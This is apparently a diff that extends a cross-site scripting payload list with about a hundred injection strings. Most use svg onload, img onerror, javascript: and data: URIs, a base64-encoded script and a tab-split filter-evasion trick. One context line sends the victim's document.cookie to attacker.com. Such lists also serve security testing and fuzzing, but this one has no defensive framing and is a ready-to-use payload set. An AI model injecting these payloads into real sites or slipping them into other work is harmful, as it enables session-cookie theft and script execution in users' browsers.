@@ -12,3 +12,108 @@
 <script>document.location='http://attacker.com/?cookie='+document.cookie</script>
 "><input autofocus onfocus=alert(1)>
 "><math><mi//xlink:href="data:x,<script>alert(1)</script>"></math>
+<svg/onload=alert(77)>
+<embed src='javascript:alert(13)'>
+<script>alert(90)</script>
+<object data='javascript:alert(12)'></object>
+<video><source onerror="javascript:alert(9)">
+<script>alert(1)</script>
+"><script>alert(2)</script>
+<svg/onload=alert(3)>
+<iframe src="javascript:alert(4)"></iframe>
+<math><mi//xlink:href="javascript:alert(5)"></math>
+<img src=x onerror=alert(6)>
+<marquee onstart=alert(7)>
+<object data="javascript:alert(8)"></object>
+<video><source onerror="alert(9)"></video>
+<details open ontoggle=alert(10)>
+<isindex onfocus=alert(11) autofocus>
+<input onfocus=alert(12) autofocus>
+<a href="javascript:alert(13)">Click</a>
+<body onload=alert(14)>
+<svg><script>alert(15)</script></svg>
+<img src=1 onerror=prompt(16)>
+<iframe srcdoc="<script>alert(17)</script>"></iframe>
+<b onmouseover=alert(18)>XSS</b>
+<svg><desc><![CDATA[</desc><script>alert(19)</script>]]></svg>
+<script src=data:text/javascript,alert(20)></script>
+<embed src="javascript:alert(21)">
+<keygen autofocus onfocus=alert(22)>
+<video src onerror=alert(23)>
+<svg><a xlink:href="javascript:alert(24)">X</a></svg>
+<form><button formaction="javascript:alert(25)">X</button></form>
+<svg id="X" onload="alert(26)"/>
+<input type="text" value="</script><script>alert(27)</script>">
+<textarea autofocus onfocus=alert(28)>
+<svg><g onload=alert(29)></g></svg>
+<img src="x" onerror="alert(String.fromCharCode(30))">
+<svg><animate attributeName="onload" begin="0s" dur="0.1s" fill="freeze" values="javascript:alert(31)"/></svg>
+<base href="javascript:alert(32)//">
+<video autoplay src onerror=alert(33)>
+<svg><set attributeName="onload" to="alert(34)"/></svg>
+<svg onload="alert(35)"></svg>
+<svg><script xlink:href="data:,alert(36)"></script></svg>
+<object data="data:text/html,<script>alert(37)</script>"></object>
+<meta http-equiv="refresh" content="0;url=javascript:alert(38)">
+<a href="data:text/html,<script>alert(39)</script>">X</a>
+<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(40)"></body></foreignObject></svg>
+<iframe srcdoc="<svg onload=alert(41)>"></iframe>
+<svg><style>@keyframes x{}</style><set attributeName="onload" to="alert(42)"/></svg>
+<iframe onload=alert(43)>
+<image src=x onerror=alert(44)>
+<a onclick=alert(45)>Click</a>
+<svg><script>alert(46)</script></svg>
+<svg/onload=confirm(47)>
+<svg/onload=prompt(48)>
+<div onpointerenter=alert(49)>X</div>
+<a href="jav	ascript:alert(50)">Click</a>
+<img src=x onerror=confirm(51)>
+<svg/onload=console.log(52)>
+<marquee onmouseover=alert(53)>X</marquee>
+<details open ontoggle=alert(54)>
+<fieldset onmouseenter=alert(55)>X</fieldset>
+<input type="image" src=x onerror=alert(56)>
+<svg><script>alert(57)</script></svg>
+<svg><desc><![CDATA[</desc><script>alert(58)</script>]]></svg>
+<form><input type=submit formaction="javascript:alert(59)"></form>
+<input type="text" value="</textarea><script>alert(60)</script>">
+<iframe src="data:text/html,<script>alert(61)</script>"></iframe>
+<a href="http://www.evil.com" onclick="alert(62)">Click</a>
+<svg><a xlink:href="javascript:alert(63)">Click</a></svg>
+<iframe srcdoc="<svg onload=alert(64)>"></iframe>
+<svg onload="location.href='javascript:alert(65)'"/>
+<meta http-equiv="refresh" content="0;url=javascript:alert(66)">
+<video src="x" onerror="alert(67)">
+<svg><g onload=alert(68)></g></svg>
+<a href="javascript:alert(69)">X</a>
+<script src="data:text/javascript,alert(70)"></script>
+<svg onload=alert(71)>
+<form><button formaction="javascript:alert(72)">X</button></form>
+<input type="text" value='<script>alert(73)</script>'>
+<svg><script>alert(74)</script></svg>
+<a href="data:text/html,<script>alert(75)</script>">Click</a>
+<object data="javascript:alert(76)"></object>
+<svg><animate attributeName="onload" begin="0s" dur="0.1s" fill="freeze" values="javascript:alert(77)"/></svg>
+<svg><set attributeName="onload" to="alert(78)"/></svg>
+<input onblur=alert(79) autofocus>
+<svg><script xlink:href="data:,alert(80)"></script></svg>
+<iframe srcdoc="<script>alert(81)</script>"></iframe>
+<svg><foreignObject><body onload="alert(82)"></body></foreignObject></svg>
+<svg><desc><![CDATA[</desc><script>alert(83)</script>]]></svg>
+<marquee onstart=alert(84)>
+<input type="text" value="<script>alert(85)</script>">
+<video src onerror="alert(86)"></video>
+<svg><g onload=alert(87)></g></svg>
+<form action="javascript:alert(88)"><input type="submit"></form>
+<svg><script>alert(89)</script></svg>
+<svg><script xlink:href="data:text/javascript,alert(90)"></script></svg>
+<a href="javascript:alert(91)">XSS</a>
+<script src="data:text/javascript;base64,YWxlcnQoOTIp"></script>
+<svg/onload=alert(93)>
+<svg><g onload=alert(94)></g></svg>
+<svg><a xlink:href="javascript:alert(95)">Link</a></svg>
+<iframe onload="alert(96)"></iframe>
+<svg onload=alert(97)>
+<object data="javascript:alert(98)"></object>
+<svg><desc><![CDATA[</desc><script>alert(99)</script>]]></svg>
+<script>alert(100)</script>
